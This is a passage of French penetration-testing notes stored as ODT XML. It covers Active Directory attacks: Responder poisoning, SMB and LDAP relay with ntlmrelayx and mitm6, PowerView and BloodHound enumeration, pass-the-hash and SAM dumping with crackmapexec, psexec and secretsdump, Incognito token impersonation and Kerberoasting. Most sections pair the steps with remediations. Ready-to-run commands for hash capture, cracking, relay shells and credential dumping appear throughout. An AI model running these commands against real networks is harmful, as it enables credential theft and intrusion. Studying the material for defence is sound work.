      <text:p text:style-name="P17"><text:span text:style-name="T3">r</text:span>esponder -I &lt;<text:span text:style-name="T4">network_interface&gt;</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T7">r</text:span><text:span text:style-name="T6">esponder -I &lt;</text:span><text:span text:style-name="T8">network_interface&gt;</text:span><text:span text:style-name="T6"> -rdw </text:span>(attention, vérifier que les flags ne cassent rien, <text:span text:style-name="T5">ça peut être le cas avec -r pour répondre au netbios wredir et -d pour répondre aux suffixes de domaine</text:span>)</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14">On récupère des hashes que l’on casse ensuite avec John ou Hashcat</text:p>
      <text:p text:style-name="P16">hashcat -m 5600 hash.txt rockyou.txt</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P5">1.3 Remédiation</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">- <text:span text:style-name="T23">Désactiver LLMNR et NBT-NS</text:span></text:p>
      <text:p text:style-name="P22"><text:tab/>- <text:span text:style-name="T23">Pour LLMNR : sélectionner « Turn OFF Multicast Name Resolution » dans Local <text:tab/>Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS <text:tab/>Client dans Group Policy Editor ».</text:span></text:p>
      <text:p text:style-name="P22"><text:tab/>- <text:span text:style-name="T23">Pour NBT-NS : Aller dans Network Connections &gt; Networ Adapter Properties &gt; TCP/IPv4 <text:tab/>Properties &gt; Advanced tab &gt; WINS tab et sélectionner « Disable NetBIOS over TCP/IP ».</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P35">Si l’entreprise ne peut pas les désactiver :</text:p>
      <text:p text:style-name="P35"><text:tab/>- Mettre en place un NAC (Network Access Control)</text:p>
      <text:p text:style-name="P35"><text:tab/>- Mettre en place une politique de mots de passe fort</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P3"><text:span text:style-name="T27">2</text:span>. <text:span text:style-name="T27">SMB Relay Attack</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">2.1 C’est quoi ?</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">Au lieu de casser les hashes que l’on a récupérés avec Responder, nous allons les relayer à des machines afin d’en obtenir l’accès.</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P24">Prérequis : </text:p>
      <text:p text:style-name="P24"><text:soft-page-break/>- <text:span text:style-name="T6">SMB signing</text:span> <text:span text:style-name="T24">(signature SMB) </text:span>doit être désactivé<text:span text:style-name="T24">e</text:span> sur la machine cible</text:p>
      <text:p text:style-name="P24">- Le user dont le hash est relayé doit être admin sur la machine <text:span text:style-name="T25">cible</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P25">Étapes :</text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T35">1</text:span>- Trouver des hôtes qui ont la signature SMB désactivée : </text:p>
      <text:p text:style-name="P30"><text:tab/>- <text:span text:style-name="T11">nmap –script=sm2-security-mode.nse -p445 192.168.10.0/24</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T30">V</text:span><text:span text:style-name="T29">oir dans le résultat, si il y a</text:span><text:span text:style-name="T6"> not required, </text:span><text:span text:style-name="T29">on peut faire l’attaque sur cette machine</text:span></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T29">On ajoute les IP dans targets.txt</text:span></text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P25"><text:span text:style-name="T35">2</text:span>- Aller dans /<text:span text:style-name="T36">etc/responder/</text:span>Responder.conf et mettre SMB et HTTP en OFF</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T35">3</text:span>- Lance Responder : même commande que précédemment</text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T35">4</text:span>- Lance <text:span text:style-name="T9">pyt</text:span><text:span text:style-name="T10">h</text:span><text:span text:style-name="T9">on </text:span><text:span text:style-name="T6">ntlmrelayx.py -tf targets.txt -smb2support</text:span> (on trouve cet outil dans Impacket)</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P29">Si ça marche, on peut obtenir <text:span text:style-name="T37">des hashes du</text:span> fichier SAM (usernames et hash<text:span text:style-name="T26">es</text:span> des users locaux).</text:p>
      <text:p text:style-name="P33">On a donc la possibilité de bouger latéralement sur la machine.</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P34"><text:span text:style-name="T38">On peut aussi obtenir un shell</text:span> :</text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T6">- ntlmrelayx.py -tf targets.txt -smb2support</text:span> <text:span text:style-name="T6">-</text:span><text:span text:style-name="T12">i</text:span></text:p>
      <text:p text:style-name="P28">- <text:span text:style-name="T39">On se connect avec Netcat au shell qui nous est indiqué dans la réponse de ntlmrelayx :</text:span></text:p>
      <text:p text:style-name="P28"><text:tab/>- <text:span text:style-name="T13">nc 127.0.0.1 11001</text:span></text:p>
      <text:p text:style-name="P37"><text:span text:style-name="T39">O</text:span>n est dans un shell SMB</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P54">2.2 Remédiation</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P40">1 . Activé la signature SMB sur toutes les machines</text:p>
      <text:p text:style-name="P40">- Pour : stop l’attaque</text:p>
      <text:p text:style-name="P40">- Contre : peut poser des soucis de performances avec les copies de fichiers</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P38"><text:span text:style-name="T40">2. Désactivé l’authentification NTLM sur le réseau</text:span></text:p>
      <text:p text:style-name="P38">- <text:span text:style-name="T40">Pour : stop l’attaque</text:span></text:p>
      <text:p text:style-name="P38">- <text:span text:style-name="T40">Contre </text:span>: <text:span text:style-name="T40">si Kerberos ne fonctionne plus, Windows retourne sur NTLM par défaut</text:span></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P40">3. <text:span text:style-name="T6">Account tiering</text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T6">- </text:span>Pour : limite les admins du domaine à certaines tâches (comme se connecter uniquement aux serveurs ayant besoin d’un admin du domaine)</text:p>
      <text:p text:style-name="P40">- Contre : implémenter la politique peut être difficile</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">4. Restriction sur l’admin local</text:p>
      <text:p text:style-name="P40">- Pour : prévient le mouvement latéral</text:p>
      <text:p text:style-name="P40">- Contre : peut entraîner une augmentation du nombre de tickets au service desk</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P55"><text:span text:style-name="T27">3</text:span>. <text:span text:style-name="T27">IPv6 attack </text:span><text:span text:style-name="T28">(DNS take over attack via IPv6)</text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P56">3.1 C’est quoi ?</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P43">Une autre forme de relay, mais très <text:span text:style-name="T6">reliable</text:span></text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P44">IPv6 peut être activé mais personne ne fait le DNS, on prend donc la place du DNS</text:p>
      <text:p text:style-name="P45">On peut alors avoir l’authentification au Domaine Controller via LDAP ou SMB <text:span text:style-name="T41">si on relaie un domain admin</text:span>.</text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50"><text:soft-page-break/>On fait tourner mitm6 pendant 5 ou 10 minutes car ça risque de perturber l’environnement <text:span text:style-name="T44">(cf : https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-ipv6-dns-takeover-with-mitm6)</text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57">3.2 Etapes</text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P46">On utilise l’outil m<text:span text:style-name="T42">i</text:span>tm6</text:p>
      <text:p text:style-name="P47">cd /opt</text:p>
      <text:p text:style-name="P47">git clone https://github.com/dirkjanm/mitm6</text:p>
      <text:p text:style-name="P47">cd dans le dossier</text:p>
      <text:p text:style-name="P47">pip<text:span text:style-name="T73">2</text:span> install .</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P48">On lance mitm6 : <text:span text:style-name="T6">mitm6 -d &lt;domain name&gt;</text:span></text:p>
      <text:p text:style-name="P49">On lance : <text:span text:style-name="T6">ntlmrelayx.py -6 -t ldaps://&lt;IP domain controller&gt; -wh exemple.blabla.local -l </text:span><text:span text:style-name="T14">lootme</text:span></text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T43">-</text:span><text:span text:style-name="T47">wh : </text:span><text:span text:style-name="T48">l</text:span><text:span text:style-name="T47">orsqu'une demande NTLM est reçue par ntlmrelayx, il vérifie l'adresse IP source de la demand</text:span><text:span text:style-name="T48">e.</text:span><text:span text:style-name="T47"> </text:span>Si cette adresse IP correspond à une des adresses IP spécifiées avec le flag -wh, alors ntlmrelayx procédera <text:span text:style-name="T48">au</text:span> relaie de l'authentification NTLM vers cette cible spécifique.</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P63">3.3 Remédiations</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P61">Définir des block rules <text:span text:style-name="T46">si on ne peut pas désactiver l’IPv6</text:span> :</text:p>
      <text:p text:style-name="P61">- <text:span text:style-name="T45">Inbound  Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)</text:span></text:p>
      <text:p text:style-name="P61">- <text:span text:style-name="T45">Inbound : Core Networking – Router Advertisement (ICMPv6-In)</text:span></text:p>
      <text:p text:style-name="P61">- <text:span text:style-name="T45">Outbound : Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)</text:span></text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P62">Si WPAD n’est pas utilisé en interne, le désactiver avec les Group Policy et en désactivant le service WinHttpAutoProxySvc</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P62">Autoriser la signature LDAP et le LDAP channel binding</text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P9">POST-COMPROMISE ENUMERATION</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P67">1. Powerview</text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P138">1.1 Présentation</text:p>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P76">Télécharger sur : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</text:p>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P78">Il faut placer le script sur une machine que l’on a compr<text:span text:style-name="T49">omi</text:span>s</text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P139">1.2 Énumération du domaine</text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P79">Commandes: </text:p>
      <text:p text:style-name="P79">- cmd</text:p>
      <text:p text:style-name="P79">- On va dans le folder où PowerView se trouve</text:p>
      <text:p text:style-name="P79">- <text:span text:style-name="T6">powershell -ep bypass</text:span></text:p>
      <text:p text:style-name="P79">- <text:span text:style-name="T6">. .</text:span><text:span text:style-name="T15">\PowerView.ps1</text:span></text:p>
      <text:p text:style-name="P155"/>
      <text:p text:style-name="P156"><text:soft-page-break/>- Get-NetDomain</text:p>
      <text:p text:style-name="P80">Information sur le domaine</text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P80">- <text:span text:style-name="T16">Get-NetDomainController</text:span></text:p>
      <text:p text:style-name="P81">Information sur le DC spécifiquement, <text:span text:style-name="T50">permet de l’identifier si ce n’est pas encore le cas</text:span></text:p>
      <text:p text:style-name="P81"/>
      <text:p text:style-name="P82">- <text:span text:style-name="T17">Get-DomainPolicy</text:span></text:p>
      <text:p text:style-name="P82"><text:s/><text:span text:style-name="T51">Montre les Policies sur le Domaines</text:span></text:p>
      <text:p text:style-name="P82"><text:tab/>- <text:span text:style-name="T19">(Get-DomainPolicy). "system access"</text:span></text:p>
      <text:p text:style-name="P82"><text:tab/><text:span text:style-name="T51">Infos sur la policy spécifiée</text:span></text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P83">- <text:span text:style-name="T6">Get-NetUser</text:span></text:p>
      <text:p text:style-name="P83">Infos sur les users</text:p>
      <text:p text:style-name="P83"><text:tab/>- <text:span text:style-name="T6">Get-NetUser | select cn</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/>Uniquement les nom d’utilisateurs</text:p>
      <text:p text:style-name="P83"><text:tab/>- <text:span text:style-name="T6">Get-NetUser | select sa</text:span><text:span text:style-name="T18">m</text:span><text:span text:style-name="T6">accountname</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/>Uniquement les sam account name</text:p>
      <text:p text:style-name="P83"><text:tab/>- <text:span text:style-name="T6">Get-NetUser | select description</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/>Affiche la description uniquement</text:p>
      <text:p text:style-name="P83"/>
      <text:p text:style-name="P83">- <text:span text:style-name="T18">Get-UserProperty</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T58">Properties d’un user</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/>- <text:span text:style-name="T18">Get-UserProperty -Properties pwdlastset</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/><text:span text:style-name="T58">Savoir quand un mdp a été </text:span><text:span text:style-name="T59">config </text:span><text:span text:style-name="T58">pour la dernière fois</text:span></text:p>
      <text:p text:style-name="P83"><text:tab/><text:span text:style-name="T60">-</text:span><text:span text:style-name="T53"> </text:span><text:span text:style-name="T57">Get</text:span><text:span text:style-name="T61">-</text:span><text:span text:style-name="T57">UserProperty -Properties logonaccount</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T53"><text:tab/>Permet d’identifier les comptes honeypot</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T53"><text:tab/>- </text:span><text:span text:style-name="T56">Get-UserProperty -Properties badpwdcount</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T54"><text:tab/>Savoir combien d’échecs ont été fait avec les mdp de chaque compte</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T54"/></text:p>
      <text:p text:style-name="P84"><text:span text:style-name="T54">-</text:span><text:span text:style-name="T52"> </text:span><text:span text:style-name="T55">Get-NetComputer</text:span></text:p>
      <text:p text:style-name="P84">Liste des machines sur le domaine</text:p>
      <text:p text:style-name="P84"><text:tab/>- <text:span text:style-name="T6">Get-NetComputer -FullData</text:span></text:p>
      <text:p text:style-name="P84"><text:tab/>Plus d'infos</text:p>
      <text:p text:style-name="P84"><text:tab/>- <text:span text:style-name="T20">Get-NetComputer -FullData | select OperatingSystem</text:span></text:p>
      <text:p text:style-name="P85"><text:tab/>Voir les OS présents sur le domaine</text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P86">- <text:span text:style-name="T6">Get-NetGroup</text:span></text:p>
      <text:p text:style-name="P86">Liste les groupes</text:p>
      <text:p text:style-name="P86"><text:tab/>- <text:span text:style-name="T6">Get-NetGroup -Groupname "Domain Admins"</text:span></text:p>
      <text:p text:style-name="P86"><text:tab/>Listes uniquement les groupes avec le nom selectionné</text:p>
      <text:p text:style-name="P86"><text:tab/>- <text:span text:style-name="T6">Get-Netgroup -Groupname *admin*</text:span></text:p>
      <text:p text:style-name="P86"><text:tab/>Listes les groupes avec "admin" dans leur nom</text:p>
      <text:p text:style-name="P87"><text:tab/>- <text:span text:style-name="T21">Get-NetGroupeMember -GroupName "Domain Admins"</text:span></text:p>
      <text:p text:style-name="P88"><text:tab/>Nous donne la liste des users dans le groupe sélectionné</text:p>
      <text:p text:style-name="P88"/>
      <text:p text:style-name="P88"/>
      <text:p text:style-name="P89">- <text:span text:style-name="T6">Invoke-ShareFinder</text:span></text:p>
      <text:p text:style-name="P89">Liste les shares SMB sur le réseau</text:p>
      <text:p text:style-name="P89"/>
      <text:p text:style-name="P90">- <text:span text:style-name="T6">Get-NetGPO</text:span></text:p>
      <text:p text:style-name="P90">Liste les group policies</text:p>
      <text:p text:style-name="P90"><text:tab/>- Get-NetGPO | select dsiplayname, whenchanged</text:p>
      <text:p text:style-name="P90"><text:soft-page-break/><text:tab/>Liste les noms des policies de groupe et la date de la dernière modif</text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="P68">2. Bloodhound</text:p>
      <text:p text:style-name="P68"/>
      <text:p text:style-name="P140">2.1 Installation</text:p>
      <text:p text:style-name="P140"/>
      <text:p text:style-name="P157">apt install bloodhound</text:p>
      <text:p text:style-name="P91"/>
      <text:p text:style-name="P158">neo4j console</text:p>
      <text:p text:style-name="P92">On change notre mdp par défau<text:span text:style-name="T63">t</text:span></text:p>
      <text:p text:style-name="P92"/>
      <text:p text:style-name="P159">bloodhound</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T62">(</text:span>creds neon4j<text:span text:style-name="T62">)</text:span></text:p>
      <text:p text:style-name="P93"/>
      <text:p text:style-name="P141">2.2 Utilisation</text:p>
      <text:p text:style-name="P141"/>
      <text:p text:style-name="P94">On récupère https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 et https://github.com/dirkjanm/BloodHound.py</text:p>
      <text:p text:style-name="P142"/>
      <text:p text:style-name="P142">2.2.2 SharpHound</text:p>
      <text:p text:style-name="P94">cmd</text:p>
      <text:p text:style-name="P160">powershell -ep bypass</text:p>
      <text:p text:style-name="P160">. .\SharpHound.ps1</text:p>
      <text:p text:style-name="P161">Invoke-BloodHound -CollectionMethod All -Domain exemple.local -ZipFileName file.zip</text:p>
      <text:p text:style-name="P95">Copie le zip sur notre machine d'attaques</text:p>
      <text:p text:style-name="P95"/>
      <text:p text:style-name="P96">Sur Bloodhound :</text:p>
      <text:p text:style-name="P97">Update datas, on sélectionne le zip</text:p>
      <text:p text:style-name="P99">On peut commencer</text:p>
      <text:p text:style-name="P98"/>
      <text:p text:style-name="P98"/>
      <text:p text:style-name="P10">POST-COMPROMISE ATTACKS</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P69">1. Pass the hash / Pass the password</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P106">Si on casse le mot de passe on si on dump les hashes de la SAM, on peut effectuer un mouvement latéral sur le réseau.<text:span text:style-name="T63"> On peut utiliser l'outil crackmapexec</text:span></text:p>
      <text:p text:style-name="P107"/>
      <text:p text:style-name="P145">1.1 Installer crackmapexec</text:p>
      <text:p text:style-name="P109"/>
      <text:p text:style-name="P163">apt install crackmapexec</text:p>
      <text:p text:style-name="P163"/>
      <text:p text:style-name="P146">1.2 Utilisation</text:p>
      <text:p text:style-name="P110"/>
      <text:p text:style-name="P147"><text:span text:style-name="T68">1.2.1 </text:span>Pass the password</text:p>
      <text:p text:style-name="P147"/>
      <text:p text:style-name="P164">crackmapexec<text:span text:style-name="T64"> smb</text:span> &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;pass&gt; </text:p>
      <text:p text:style-name="P110"/>
      <text:p text:style-name="P111">Si on a un match:</text:p>
      <text:p text:style-name="P112">On se connecte :</text:p>
      <text:p text:style-name="P111"><text:soft-page-break/><text:span text:style-name="T6">psexec.py</text:span><text:span text:style-name="T22"> </text:span><text:span text:style-name="T6"><text:s/></text:span><text:span text:style-name="T22">&lt;domaine_name&gt;/jdoe:Pass123@192.168.12.12</text:span></text:p>
      <text:p text:style-name="P111">On essaie de dumper la SAM<text:span text:style-name="T66"> :</text:span></text:p>
      <text:p text:style-name="P165">crackmapexec<text:span text:style-name="T64"> smb</text:span> &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;pass&gt; <text:span text:style-name="T65">--sam</text:span></text:p>
      <text:p text:style-name="P108"/>
      <text:p text:style-name="P113">Dumper les hash avec secretsdump<text:span text:style-name="T67"> :</text:span></text:p>
      <text:p text:style-name="P166">secretsdump.py &lt;domain_name&gt;/jdoe:Pass123@192.168.12.12</text:p>
      <text:p text:style-name="P114">On récupère les hashes</text:p>
      <text:p text:style-name="P114"/>
      <text:p text:style-name="P114">Casser les hashes:</text:p>
      <text:p text:style-name="P168">hashcat<text:span text:style-name="T69"> </text:span><text:span text:style-name="T70">-m 1000 hash.txt rockyou.txt</text:span></text:p>
      <text:p text:style-name="P168"/>
      <text:p text:style-name="P168"><text:span text:style-name="T33">1.2.2 Pass the Hash</text:span> </text:p>
      <text:p text:style-name="P167"/>
      <text:p text:style-name="P169">crackmapexec smb <text:span text:style-name="T71">192.168.1.0/24 -u "John Doe" -H &lt;copier hash ici&gt; --local-auth</text:span></text:p>
      <text:p text:style-name="P169"/>
      <text:p text:style-name="P115">On peut aussi se connecter avec psexec<text:span text:style-name="T72"> pour avoir un shell</text:span>:</text:p>
      <text:p text:style-name="P170">psexec.py "john doe":@192.168.12.12 -hashes &lt;copier le hash ici&gt;</text:p>
      <text:p text:style-name="P148"/>
      <text:p text:style-name="P148">1.3 Remédiation</text:p>
      <text:p text:style-name="P148"/>
      <text:p text:style-name="P116">Difficile de l'empêcher complètement.</text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P116">- Eviter de réutiliser des creds :</text:p>
      <text:p text:style-name="P116"><text:tab/>- Réutilisation du mdp d'admin local</text:p>
      <text:p text:style-name="P116"><text:tab/>- Désactiver les comptes Guest et Administrator </text:p>
      <text:p text:style-name="P116"><text:tab/>- Moindre privilège : limiter qui peut être local admin</text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P116">- Mdp <text:span text:style-name="T89">fort</text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P116">- Privilege Access Management (PAM)</text:p>
      <text:p text:style-name="P116"><text:tab/>-<text:span text:style-name="T87"> vérifier l'accès à un compte sensible lorsque cela est nécessaire</text:span></text:p>
      <text:p text:style-name="P117"><text:tab/>- change le mdp automatiquement à chaque accès et log out</text:p>
      <text:p text:style-name="P117"><text:tab/>- Limite ces attaques car les hash<text:span text:style-name="T88">es</text:span> et les mdp sont fort et changés régulièrement</text:p>
      <text:p text:style-name="P117"/>
      <text:p text:style-name="P117"/>
      <text:p text:style-name="P70">2. Token Impersonation</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P149">2.1 Overview</text:p>
      <text:p text:style-name="P149"/>
      <text:p text:style-name="P118">Deux types de tokens : </text:p>
      <text:p text:style-name="P118"><text:tab/>-<text:span text:style-name="T6"> Delegate</text:span> : créés pour se logger à une machine ou utiliser RDP</text:p>
      <text:p text:style-name="P186"><text:span text:style-name="T75"><text:tab/>- <text:s/></text:span><text:span text:style-name="T77">Impersonate: </text:span><text:span text:style-name="T78">créé</text:span><text:span text:style-name="T79">s</text:span><text:span text:style-name="T78"> lorsque les utilisateurs se connectent de manière non interactive à un système, par exemple en accédant à un disque partagé sur le réseau. En général, les utilisateurs ne sont pas invités à fournir des informations d'identification lorsqu'ils accèdent au partage ; ils utilisent leurs jetons pour l'accès.</text:span></text:p>
      <text:p text:style-name="P186"><text:span text:style-name="T78"/></text:p>
      <text:p text:style-name="P59"><text:span text:style-name="T84">2.2 </text:span><text:span text:style-name="T85">Avec Incognito</text:span><text:span text:style-name="T86"> (Metasploit)</text:span></text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T80"/></text:p>
      <text:p text:style-name="P65"><text:span text:style-name="T80">On part du principe que l'on a déjà un shell avec Metasploit </text:span><text:span text:style-name="T81">(en utilisant windows/smb/psexec)</text:span></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T80">Payload : windows/x64/meterpreter/reverse_tcp</text:span></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T80"/></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T80">Sur la session</text:span><text:span text:style-name="T82"> meterpreter</text:span><text:span text:style-name="T80">:</text:span></text:p>
      <text:p text:style-name="P18"><text:soft-page-break/><text:span text:style-name="T80">load incognito</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T80">list_tokens -u </text:span><text:span text:style-name="T74">(liste les tokens)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T80">impersonate_token &lt;nom trouver avec la commande précédente&gt;</text:span><text:span text:style-name="T83"> </text:span><text:span text:style-name="T76">(ex: domain\\administrator)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T80">whoami </text:span><text:span text:style-name="T74">(on est l'utilisateur sélectionné précédemment)</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T80">rev2self </text:span><text:span text:style-name="T74">(on redevient le user que l'on était avant l'attaque)</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T80"/></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T84">2.3 Remédiation</text:span></text:p>
      <text:p text:style-name="P52"><text:span text:style-name="T84"/></text:p>
      <text:p text:style-name="P52"><text:span text:style-name="T84">- Limiter les autorisations afin que les utilisateurs et les groupes d'utilisateurs ne puissent pas créer de tokens. Ce paramètre ne doit être défini que pour le compte système local. GPO : Configuration de l'ordinateur &gt; [Stratégies] &gt; Paramètres Windows &gt; Paramètres de sécurité &gt; Stratégies locales &gt; Attribution des droits d'utilisateur : Créer un objet jeton. Définissez également qui peut créer un jeton au niveau du processus, uniquement pour le service local et le service réseau, par l'intermédiaire d'un GPO : Configuration de l'ordinateur &gt; [Politiques] &gt; Paramètres Windows &gt; Paramètres de sécurité &gt; Politiques locales &gt; Attribution des droits d'utilisateur : Remplacer un jeton de niveau processus.</text:span></text:p>
      <text:p text:style-name="P52"><text:span text:style-name="T84"/></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T84">- Les administrateurs doivent se connecter en tant qu'utilisateur standard, mais exécuter leurs outils avec des privilèges d'administrateur en utilisant la commande intégrée de manipulation des jetons d'accès (runas).</text:span></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T84"/></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T84">- Un adversaire doit déjà disposer d'un accès de niveau administrateur sur le système local pour pouvoir utiliser pleinement cette technique ; veillez à limiter les utilisateurs et les comptes aux privilèges les moins importants dont ils ont besoin.</text:span></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T84"/></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T84"/></text:p>
      <text:p text:style-name="P71"><text:span text:style-name="T90">3</text:span>. Kerberoasting</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P150"><text:span text:style-name="T90">3</text:span>.1 Overview</text:p>
      <text:p text:style-name="P150"/>
      <text:p text:style-name="P119">Le but est d'obtenir un TS et déchiffrer le hash du compte associé</text:p>
      <text:p text:style-name="P119"/>
      <text:p text:style-name="P120">On doit avoir les creds d'un user valide (même si pas admin)<text:span text:style-name="T91">.</text:span></text:p>
      <text:p text:style-name="P120"/>
      <text:p text:style-name="P151">3.2 Déroulement de l'attaque</text:p>
      <text:p text:style-name="P151"/>
      <text:p text:style-name="P171">GetUserSPNs.py <text:span text:style-name="T92">&lt;domain_name.local&gt;/jdoe:Pass123 -dc-ip &lt;IP du DC&gt; -request</text:span></text:p>
      <text:p text:style-name="P121"/>
      <text:p text:style-name="P122">On obtient le hash<text:span text:style-name="T93"> d'un service</text:span></text:p>
      <text:p text:style-name="P123">On le copie et on le casse</text:p>
      <text:p text:style-name="P123"/>
      <text:p text:style-name="P172">hashcat -m 13100 hash.txt rockyou.txt</text:p>
      <text:p text:style-name="P124">Si on connais le -m : <text:span text:style-name="T6">hashcat --help | grep Kerberos</text:span></text:p>
      <text:p text:style-name="P125"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P124"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P152">3.3 Remédiation</text:p>
      <text:p text:style-name="P152"/>
      <text:p text:style-name="P126">- Mdp fort</text:p>
      <text:p text:style-name="P126">- Moindre privilège</text:p>
      <text:p text:style-name="P72">4. GPP Password Attacks</text:p>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P143">4.1 Overview</text:p>
      <text:p text:style-name="P143"/>
      <text:p text:style-name="P100">Attaque assez ancienne mais<text:span text:style-name="T94"> bon à checker. Patcher avec MS14-025</text:span><text:span text:style-name="T95">.</text:span></text:p>
      <text:p text:style-name="P101">Exploite les préférences de stratégie de groupe (GPP) :</text:p>
      <text:p text:style-name="P101"/>
      <text:p text:style-name="P188"><text:span text:style-name="Strong_20_Emphasis">Exposition des mots de passe</text:span> : Les préférences de stratégie de groupe GPP permettent d'enregistrer des mots de passe de manière non sécurisée (c'est-à-dire en texte brut) dans les objets de stratégie de groupe. Ces mots de passe sont stockés dans le fichier SYSVOL, qui est accessible à tous les utilisateurs et ordinateurs du domaine.</text:p>
      <text:list xml:id="list4126663159" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P187"><text:span text:style-name="Strong_20_Emphasis">Récupération des mots de passe</text:span> : Les attaquants peuvent utiliser des outils et des scripts pour récupérer et déchiffrer les mots de passe exposés dans les préférences de stratégie de groupe. Une fois récupérés, ces mots de passe peuvent être utilisés pour compromettre des comptes, accéder à des systèmes, ou effectuer d'autres actions malveillantes.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P187"><text:span text:style-name="Strong_20_Emphasis">Impact et conséquences</text:span> : L'attaque GPP peut avoir des conséquences graves, car elle peut permettre aux attaquants d'obtenir des accès non autorisés à des ressources et des informations sensibles, compromettre la sécurité du réseau, et entraîner des violations de données et d'autres incidents de sécurité.</text:p>
        </text:list-item>
        <text:list-item>
